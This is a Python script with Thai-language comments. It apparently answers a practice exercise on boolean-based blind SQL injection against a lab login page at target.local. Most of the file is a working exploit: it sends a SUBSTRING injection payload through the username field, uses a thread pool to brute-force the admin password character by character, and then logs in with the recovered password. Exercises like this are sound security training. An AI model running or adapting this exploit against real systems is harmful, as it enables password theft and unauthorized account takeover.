# ภารกิจที่ 1: The Blind Miner (Boolean-Based Blind SQLi)

# สถานการณ์: คุณพบช่องโหว่ SQL Injection ที่หน้าล็อกอิน (http://target.local/login) ในช่อง Username แต่ระบบไม่ได้แสดง Error หรือผลลัพธ์ของ Database ออกมาให้เห็น (Blind SQLi) สิ่งเดียวที่ระบบบอกคือ:
# ถ้าเงื่อนไข SQL เป็น จริง ระบบจะตอบว่า {"status": "success", "msg": "Welcome!"}
# ถ้าเงื่อนไข SQL เป็น เท็จ ระบบจะตอบว่า {"status": "error", "msg": "Invalid credentials"}
# คุณรู้ว่า Password ของแอดมินถูกเก็บไว้ และคุณมี Payload พื้นฐาน:
# admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), {index}, 1) = '{char}' --

# โจทย์:
# จงเขียนสคริปต์ Python โดยใช้ requests เพื่อค้นหารหัสผ่านของ Admin (สมมติว่ารหัสผ่านมีความยาว 10 ตัวอักษรและเป็นพิมพ์เล็ก+ตัวเลข)
# คำใบ้: คุณต้องใช้ลูป (Loop) ซ้อนกัน ลูปแรกกำหนดตำแหน่งตัวอักษร (index 1 ถึง 10) ลูปที่สองสุ่มตัวอักษร a-z, 0-9 (char) ไปเช็คทีละตัว
# ความท้าทายพิเศษ (Bonus): ลองใช้ concurrent.futures เพื่อเร่งความเร็วในการเดาทีละตัวอักษร

import requests
import concurrent.futures

txt=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
url="http://target.local/login"

pass_admin=['1','2','3','4','5','6','7','8','9','0']

def find_character(idx,c):
    payload=f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1) = '{c}' --"
    data_to_send = {
            "username": payload,
            "password":""
        }
    print("[*] กำลังส่ง payload ไปยัง server...")
    try:
        response=requests.post(url,data_to_send,timeout=0.75)
        if "Welcome!" in response.text:
            return (idx,c)
    except requests.Timeout :
        return None

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    outcome = [executor.submit(find_character,idx,c) for idx in range(1,11) for c in txt]

    for output in concurrent.futures.as_completed(outcome):
        result=output.result()
        if result is not None:
            pass_admin[result[0]-1]=result[1]
try:
    data_to_send = {
                "username": "admin",
                "password":"".join(pass_admin)
            }
    response=requests.post(url,data_to_send,timeout=0.75)
    if "Welcome!" in response.text :
        print(f"[!!!] Successfully login as admin with password: {pass_admin}")
except requests.Timeout:
    print("[*] Time out, please try again later")

            

